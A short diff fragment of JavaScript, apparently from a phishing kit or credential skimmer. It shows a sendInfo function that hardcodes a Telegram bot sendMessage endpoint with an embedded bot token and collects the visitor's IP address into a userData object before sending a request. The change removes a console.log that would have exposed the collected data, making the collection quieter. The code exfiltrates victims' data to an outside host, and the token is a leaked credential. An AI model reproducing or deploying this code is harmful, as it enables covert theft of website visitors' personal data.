@@ -18,7 +18,6 @@ var sendInfo = function(endpoint){
     endpoint='https://api.telegram.org/bot1144251938:AAFc1ywZOJUeb2fzSw54fVBTxdarxAVuM20/sendMessage';
     $.getJSON('https://json.geoiplookup.io/?callback=?', function(dataIP) {
       userData.IP=dataIP;
-      console.log(userData);
     });
     setTimeout(function(){
         var xhr = new XMLHttpRequest();
